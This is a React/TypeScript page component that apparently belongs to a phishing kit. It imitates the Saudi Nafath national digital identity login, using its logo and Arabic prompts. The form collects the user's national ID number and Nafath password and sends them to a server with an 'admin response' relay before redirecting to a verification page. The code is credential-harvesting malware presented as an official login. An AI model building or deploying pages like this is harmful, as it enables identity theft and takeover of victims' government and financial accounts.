import Main from "@/components/MainWrapper";
import { FieldValues, useForm } from "react-hook-form";
import { mainInfo } from "../../real-time/context/signals";
import { LockIcon, User } from "lucide-react";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";
import styles from "./typeEffect.module.css";
import { cn } from "@/lib/utils";
import Input from "@/components/Input";

function Nafaz() {
  useEffect(() => {
    setCurrentPage("nafaz");
  }, []);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    // console.log(data);
    mainInfo.value = { ...mainInfo.value, idNumber: data.idNumber };

    // [ ] should be true for production
    sendDataToServer({
      data: {
        "رقم الهوية": data.idNumber,
        "كلمة مرور نفاذ": data.password,
      },
      current: "nafaz",
      nextPage: "verify-nafaz",
      waitingForAdminResponse: true,
    });
  }

  return (
    <Main>
      <div className="bg-gray-100 min-h-screen py-20">
        <form
          className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
          onSubmit={handleSubmit(sendData)}
        >
          <img
            src="/assets/images/client/Nafath.png"
            className="w-40 mx-auto mb-4"
            alt="nafaz logo"
          />
          <p className="text-xl font-black text-[hsl(176,97%,30%)] w-fit mx-auto mb-8">
            دخول سريع وآمن
          </p>
          <h2 className="mb-5 text-lg font-bold text-gray-500 text-center">
            الرجاء ادخال رقم الهوية و كلمة المرور الخاصة بهويتك الرقمية (أبشر)
          </h2>

          <div className="max-w-full">
            <p
              className={cn(
                "text-lg font-bold text-[hsl(176,97%,30%)] w-fit mb-4",
                styles.text
              )}
            ></p>
          </div>

          <Input
            errors={errors}
            register={register}
            id="idNumber"
            label="رقم بطاقة الأحوال/الاقامة"
            placeholder="أدخل رقم بطاقة الأحوال/الاقامة الخاص بك هنا"
            type="number"
            isAr
            icon={<User size={20} />}
            className="bg-[#e2e8f0] rounded-3xl"
            value={mainInfo.value.idNumber}
            options={{
              required: "هذا الحقل ضروري",
              pattern: {
                value: /^[0-9]{10}$/,
                message: "يجب كتابة عشر أرقام",
              },
            }}
          />
          <Input
            errors={errors}
            register={register}
            id="password"
            label="كلمة المرور"
            placeholder="أدخل كلمة المرور"
            type="password"
            isAr
            icon={<LockIcon size={20} />}
            className="bg-[#e2e8f0] rounded-3xl"
            options={{
              required: "هذه الحقل ضروري",
            }}
          />

          <button className="w-full mt-6 lg:text-xl capitalize rounded-3xl font-bold py-1.5 px-6 bg-[#129786] hover:brightness-110 text-white transition-colors">
            التالي
          </button>

          <p className="text-center text-sm font-medium">
            يرجى فتح تطبيق نفاذ لإصدار شريحة التأمين.
          </p>

          <img
            src="/assets/images/client/below-nafaz.png"
            alt="nafaz footer image"
            className="mt-4"
          />
        </form>
      </div>
    </Main>
  );
}

export default Nafaz;
